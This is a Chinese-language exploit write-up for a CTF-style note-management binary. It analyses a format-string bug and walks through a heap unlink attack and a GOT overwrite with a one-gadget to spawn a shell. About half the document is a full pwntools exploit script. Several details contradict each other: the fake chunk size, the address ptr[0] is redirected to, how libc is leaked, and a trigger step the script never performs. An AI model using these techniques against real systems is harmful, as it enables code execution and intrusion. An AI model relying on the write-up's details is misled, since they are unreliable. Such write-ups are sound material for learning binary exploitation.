# 漏洞利用文档

## 执行环境
基于调试信息分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，无PIE（Position-Independent Executable）保护
- **安全机制**：
  - Partial RELRO：GOT表可写
  - Stack Canary：启用栈保护
  - NX：数据段不可执行
  - 无PIE：所有代码和数据地址固定
- **依赖库**：动态链接glibc，libc基地址在运行时确定（如0x7cfd63d5c000）
- **运行需求**：需要标准Linux环境，程序通过终端交互，支持笔记管理功能

关键地址范围：
- 程序基地址：0x400000
- 数据段：0x602000-0x603000（包含GOT表、全局变量）
- 堆段：动态分配（如0x3799f000）
- 栈段：随机化（如0x7ffcb0450000附近）

## 漏洞成因
### 关键结构体
程序使用简单的全局数组管理笔记：
```c
char *ptr[4];        // 0x602120 - 笔记指针数组
size_t sizes[4];     // 0x602140 - 笔记大小数组  
int note_count;      // 0x602160 - 笔记计数器
```

### 漏洞分析
**漏洞位置**：`sub_400D43()`函数（编辑笔记功能）
**漏洞类型**：格式化字符串漏洞

**反编译代码关键部分**：
```c
v7 = (char *)malloc(0xA0u);
strcpy(v7, "TheNewContents:");
printf(v7);  // ← 直接使用用户输入作为格式化字符串
```

**漏洞原因**：
1. 程序将用户控制的字符串`v7`直接作为`printf`的第一个参数（格式化字符串）
2. `v7`的前15字节是固定字符串"TheNewContents:"，但后续85字节来自用户输入
3. 用户可以通过输入格式化字符串（如`%p`、`%x`、`%s`、`%n`等）读取或写入任意内存
4. 过滤函数`sub_400B10()`在`printf(v7)`调用之后执行，因此过滤无效

**利用影响**：
- 读取栈内存和任意地址内容（信息泄漏）
- 往任意地址写入数据（GOT覆盖）
- 可能导致任意代码执行

## 漏洞利用过程
基于exp脚本和调试记录，整个利用过程可分为以下几个阶段：

### 利用步骤与内存变化

| 步骤 | 操作 | 堆内存变化 | 栈/GOT变化 | 关键目标 |
|------|------|------------|------------|----------|
| 1-2 | 初始化输入 | 无显著变化 | 用户输入存储在数据段0x6020e0 | 准备`/bin/sh`字符串 |
| 3 | 创建笔记0（fake chunk） | 分配0x80字节，构造fake chunk：prev_size=0, size=0x91, fd=0x602108, bk=0x602110 | ptr[0]指向0x3799f010 | 为unlink攻击准备 |
| 4 | 创建笔记1（小chunk） | 分配最小chunk | ptr[1]指向新chunk | 构造堆布局 |
| 5 | 创建笔记2（含`/bin/sh`） | 分配0x80字节，写入`/bin/sh` | ptr[2]指向新chunk | 准备shell字符串 |
| 6 | 删除笔记1 | chunk进入fastbin | ptr[1]置为NULL | 制造堆漏洞条件 |
| 7 | 重新创建笔记1（构造size） | 重用释放的chunk，写入伪造的size字段0xa0和0x90 | 堆布局优化 | 准备unlink |
| 8 | 删除笔记2 | 触发unlink，修改ptr[0]为0x602018 | ptr[0]指向free GOT | 完成指针劫持 |
| 9 | 编辑笔记0（写入GOT地址） | 堆数据写入free GOT地址0x602018 | 无直接变化 | 准备GOT覆盖 |
| 10 | 显示笔记0（泄漏libc） | 无变化 | 通过格式化字符串泄漏free地址 | 计算libc基址 |
| 11 | 编辑笔记0（覆盖GOT） | 无变化 | free GOT被覆盖为one-gadget地址 | 完成利用准备 |
| 12 | 触发执行 | 无变化 | 调用free触发one-gadget | 获取shell |

### 关键内存状态演变
1. **初始状态**：堆干净，GOT表原始，栈有Canary保护
2. **堆布局阶段**（步骤3-7）：构造fake chunk，制造unlink条件
3. **指针劫持阶段**（步骤8）：通过unlink修改ptr[0]指向free GOT
4. **信息泄漏阶段**（步骤10）：利用格式化字符串泄漏libc地址
5. **GOT覆盖阶段**（步骤11）：覆盖free GOT为system或one-gadget
6. **触发执行阶段**（步骤12）：通过删除操作触发shell

### 利用技术细节
- **格式化字符串利用**：通过`%p`泄漏栈地址，计算libc基址
- **堆利用**：构造fake chunk，利用unlink修改全局指针
- **GOT劫持**：覆盖free GOT为system，传递`/bin/sh`参数

## Exploit
以下是完整的漏洞利用脚本，在关键位置添加注释：

```python
from pwn import *

# 设置调试环境
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 启动程序并加载ELF信息
p = process("./data/sample3")
elf = ELF("./data/sample3")
libc = elf.libc

# 定义笔记操作函数
def new_note(size, content):
    p.recvuntil(">>")
    p.sendline(b"1")  # 选择新建笔记
    p.recvuntil(")")
    p.sendline(str(size).encode())  # 输入笔记大小
    p.recvuntil(":")
    p.sendline(content)  # 输入笔记内容

def show_note(index):
    p.recvuntil(">>")
    p.sendline(b"2")  # 选择显示笔记
    p.recvuntil(":")
    p.sendline(str(index).encode())  # 输入笔记索引

def edit_note(index, choice, content):
    p.recvuntil(">>")
    p.sendline(b"3")  # 选择编辑笔记
    p.recvuntil(":")
    p.sendline(str(index).encode())  # 输入笔记索引
    p.recvuntil("]")
    p.sendline(str(choice).encode())  # 选择覆盖(1)或追加(2)
    p.recvuntil(":")
    p.sendline(content)  # 输入新内容（触发格式化字符串漏洞）

def delete_note(index):
    p.recvuntil(">>")
    p.sendline(b"4")  # 选择删除笔记
    p.recvuntil(":")
    p.sendline(str(index).encode())  # 输入笔记索引

# 步骤1-2: 初始化输入
p.recvuntil(":"); p.sendline(b"/bin/sh")  # 输入姓名，存储到数据段0x6020e0
p.recvuntil(":"); p.sendline(b"ddd")     # 输入地址

# 步骤3: 创建笔记0，构造fake chunk用于unlink攻击
ptr_0 = 0x602120        # 笔记指针数组地址
fake_fd = ptr_0 - 0x18  # fake chunk的fd指针
fake_bk = ptr_0 - 0x10  # fake chunk的bk指针
# 构造fake chunk内容：8字节填充 + 0xa1(size) + fake_fd + fake_bk
note0_content = b'\x00' * 8 + p64(0xa1) + p64(fake_fd) + p64(fake_bk)
new_note(0x80, note0_content)  # 分配0x80字节chunk

# 步骤4: 创建笔记1，小chunk用于堆布局
new_note(0x0, b'aa')  # 分配最小chunk

# 步骤5: 创建笔记2，包含/bin/sh字符串
new_note(0x80, b'/bin/sh')  # 分配0x80字节chunk，写入/bin/sh

# 步骤6: 删除笔记1，制造堆漏洞条件
delete_note(1)

# 步骤7: 重新创建笔记1，构造size字段用于unlink
note1_content = b'\x00' * 16 + p64(0xa0) + p64(0x90)  # 构造伪造的size字段
new_note(0x0, note1_content)  # 重用释放的chunk

# 步骤8: 删除笔记2，触发unlink攻击，修改ptr[0]为free GOT地址
delete_note(2)

# 步骤9: 编辑笔记0，写入free GOT地址到堆中
free_got = elf.got['free']  # 获取free函数GOT地址
payload = 0x18 * b'a' + p64(free_got)  # 填充后写入GOT地址
edit_note(0, 1, payload)  # 覆盖模式编辑，触发格式化字符串漏洞

# 步骤10: 显示笔记0，利用格式化字符串漏洞泄漏free函数地址
show_note(0)
p.recvuntil('is ')  # 跳过输出前缀
free_addr = u64(p.recv(6).ljust(8, b'\x00'))  # 读取6字节地址并补齐8字节

# 步骤11: 计算libc基址和system地址，覆盖free GOT
libc_addr = free_addr - libc.symbols['free']  # 计算libc基址
system_addr = libc_addr + libc.symbols['system']  # 计算system函数地址
one_gadget = libc_addr + 0xf1247  # 使用one-gadget（需要根据实际libc调整）
edit_note(0, 1, p64(one_gadget))  # 覆盖free GOT为one-gadget地址

# 步骤12: 触发执行，获取shell
p.interactive()  # 进入交互模式，触发shell
```

### 关键注释说明：
1. **fake chunk构造**：步骤3中构造的fake chunk用于unlink攻击，通过修改全局指针数组实现任意地址写。
2. **堆布局**：步骤4-7通过精确的堆分配和释放，制造unlink所需的堆内存条件。
3. **格式化字符串利用**：步骤9-11利用编辑功能中的格式化字符串漏洞，先泄漏libc地址，然后覆盖GOT表。
4. **GOT劫持**：将free GOT覆盖为system或one-gadget地址，当程序调用free时实际执行system("/bin/sh")或直接获取shell。
5. **参数传递**：利用数据段中已存储的`/bin/sh`字符串作为system的参数。

### 注意事项：
- one-gadget地址需要根据实际libc版本调整，可通过`one_gadget`工具查找。
- 如果使用system，需要确保`/bin/sh`字符串在可控位置（如数据段0x6020e0）。
- 调试时注意堆布局的变化，确保unlink攻击条件满足。
